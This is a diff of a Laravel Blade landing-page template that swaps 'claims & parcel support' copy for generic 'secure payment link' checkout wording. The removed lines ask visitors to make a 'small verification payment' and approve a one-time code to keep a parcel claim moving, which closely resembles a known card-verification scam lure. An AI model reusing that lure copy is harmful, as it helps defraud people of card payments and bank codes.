@@ -22,7 +22,7 @@
     </style>
 </head>
 <body>
-    <div class="topline"><div class="shell"><p class="availability"><span class="dot"></span> Claims support available</p><p>Secure &amp; encrypted card verification</p></div></div>
+    <div class="topline"><div class="shell"><p class="availability"><span class="dot"></span> Payment support available</p><p>Secure &amp; encrypted checkout</p></div></div>
     <header>
         <nav class="shell nav" aria-label="Main navigation">
             <a class="brand" href="{{ url('/') }}" aria-label="{{ $brandSettings["brand_name"] }} home">
@@ -37,19 +37,19 @@
         <section class="hero">
             <div class="shell">
                 <div>
-                    <p class="eyebrow">Claims &amp; parcel support</p>
-                    <h1>We’re here to help resolve your claim.</h1>
-                    <p class="hero-copy">Follow the secure verification link sent by our claims team to confirm your card and keep your claim moving. It takes just a few minutes.</p>
-                    <div class="hero-actions"><a class="button" href="#process">See how verification works <i class="fa-solid fa-arrow-right" aria-hidden="true"></i></a><a class="text-link" href="{{ route('admin.login') }}">Claims team sign in</a></div>
-                    <p class="hero-note">Have a link already? Open it directly from the message you received.</p>
+                    <p class="eyebrow">Secure payment processing</p>
+                    <h1>Make your payment securely.</h1>
+                    <p class="hero-copy">Open the private payment link you received to review the amount and complete checkout. Your payment details are handled securely by the payment provider.</p>
+                    <div class="hero-actions"><a class="button" href="#process">How secure checkout works <i class="fa-solid fa-arrow-right" aria-hidden="true"></i></a><a class="text-link" href="{{ route('admin.login') }}">Staff sign in</a></div>
+                    <p class="hero-note">Have a payment link already? Open it directly from the message you received.</p>
                 </div>
-                <div class="hero-visual" aria-label="Claim status illustration">
+                <div class="hero-visual" aria-label="Secure payment illustration">
                     <div class="route-card">
-                        <div class="route-top"><span>Customer claim</span><span>Secure process</span></div>
-                        <div class="parcel-icon"><i class="fa-solid fa-box-open" aria-hidden="true"></i></div>
-                        <h2>Verification in progress</h2><p>Your claim team will continue once your card is verified.</p>
+                        <div class="route-top"><span>Payment request</span><span>Secure process</span></div>
+                        <div class="parcel-icon"><i class="fa-regular fa-credit-card" aria-hidden="true"></i></div>
+                        <h2>Ready for checkout</h2><p>Review your payment details before continuing.</p>
                         <div class="progress" aria-hidden="true"><span></span><span></span><span></span></div>
-                        <div class="route-status"><span class="dot" style="background:#5b997b;box-shadow:none"></span> Secure card verification</div>
+                        <div class="route-status"><span class="dot" style="background:#5b997b;box-shadow:none"></span> Secure payment</div>
                     </div>
                     <span class="photo-credit">Photo: Guilherme Mendes / Unsplash</span>
                 </div>
@@ -57,22 +57,22 @@
         </section>
 
         <section class="assurance" aria-label="Service assurances"><div class="shell">
-            <div class="assurance-item"><span class="assurance-icon"><i class="fa-solid fa-link" aria-hidden="true"></i></span><span><strong>Private verification links</strong><small>Unique to your claim</small></span></div>
+            <div class="assurance-item"><span class="assurance-icon"><i class="fa-solid fa-link" aria-hidden="true"></i></span><span><strong>Private payment links</strong><small>Unique to your request</small></span></div>
             <div class="assurance-item"><span class="assurance-icon"><i class="fa-regular fa-credit-card" aria-hidden="true"></i></span><span><strong>Secure checkout</strong><small>Card details handled by the payment provider</small></span></div>
-            <div class="assurance-item"><span class="assurance-icon"><i class="fa-solid fa-headset" aria-hidden="true"></i></span><span><strong>Claim team follow-up</strong><small>We continue after verification</small></span></div>
+            <div class="assurance-item"><span class="assurance-icon"><i class="fa-solid fa-headset" aria-hidden="true"></i></span><span><strong>Payment support</strong><small>Help is available if you need it</small></span></div>
         </div></section>
 
         <section class="section" id="process"><div class="shell">
-            <div class="section-heading"><div><p class="eyebrow">A straightforward process</p><h2>What to expect</h2></div><p>We’ll guide you through the verification securely. You won’t need to create an account or share your card details with our team.</p></div>
+            <div class="section-heading"><div><p class="eyebrow">A straightforward process</p><h2>What to expect</h2></div><p>Complete checkout through the secure payment provider. You won’t need to create an account or share your card details with our team.</p></div>
             <div class="steps">
-                <article class="step"><span class="step-num">01 / Link</span><h3>Open your claim link</h3><p>Use the private link sent to your email or phone by the claims team.</p></article>
-                <article class="step"><span class="step-num">02 / Verify</span><h3>Confirm your card securely</h3><p>Complete the small verification payment via secure checkout. Your bank may ask you to approve it with a one-time code.</p></article>
-                <article class="step"><span class="step-num">03 / Continue</span><h3>We pick up your claim</h3><p>Once the payment is confirmed, the claims team can continue processing your request.</p></article>
+                <article class="step"><span class="step-num">01 / Link</span><h3>Open your payment link</h3><p>Use the private link sent to your email or phone.</p></article>
+                <article class="step"><span class="step-num">02 / Pay</span><h3>Review and pay securely</h3><p>Confirm the amount and complete checkout. Your bank may ask you to approve it with a one-time code.</p></article>
+                <article class="step"><span class="step-num">03 / Complete</span><h3>Your payment is processed</h3><p>You’ll receive confirmation after the payment provider confirms the transaction.</p></article>
             </div>
-            <aside class="security" id="security"><div class="security-copy"><span class="security-badge" aria-hidden="true"><i class="fa-solid fa-shield-halved"></i></span><span><h2>Your card details stay protected</h2><p>Card number and security code are entered directly in the payment provider’s secure checkout. This site stores only the payment authorization token and limited card details needed to manage your claim.</p></span></div><span>Encrypted &amp; secure checkout</span></aside>
+            <aside class="security" id="security"><div class="security-copy"><span class="security-badge" aria-hidden="true"><i class="fa-solid fa-shield-halved"></i></span><span><h2>Your card details stay protected</h2><p>Card number and security code are entered directly in the payment provider’s secure checkout. This site stores only the payment authorization token and limited card details needed to manage your payment.</p></span></div><span>Encrypted &amp; secure checkout</span></aside>
         </div></section>
     </main>
 
-    <footer><div class="shell footer"><p>© {{ date('Y') }} {{ $brandSettings["brand_name"] }}. {{ $brandSettings["brand_footer_text"] }}</p><p>@if($paymentSettings["support_email"])<a href="mailto:{{ $paymentSettings["support_email"] }}">{{ $paymentSettings["support_email"] }}</a>@elseif($paymentSettings["support_phone"]){{ $paymentSettings["support_phone"] }}@elseQuestions about your claim? Contact your claims team.@endif</p></div></footer>
+    <footer><div class="shell footer"><p>© {{ date('Y') }} {{ $brandSettings["brand_name"] }}. {{ $brandSettings["brand_footer_text"] }}</p><p>@if($paymentSettings["support_email"])<a href="mailto:{{ $paymentSettings["support_email"] }}">{{ $paymentSettings["support_email"] }}</a>@elseif($paymentSettings["support_phone"]){{ $paymentSettings["support_phone"] }}@elseQuestions about a payment? Contact support.@endif</p></div></footer>
 </body>
 </html>
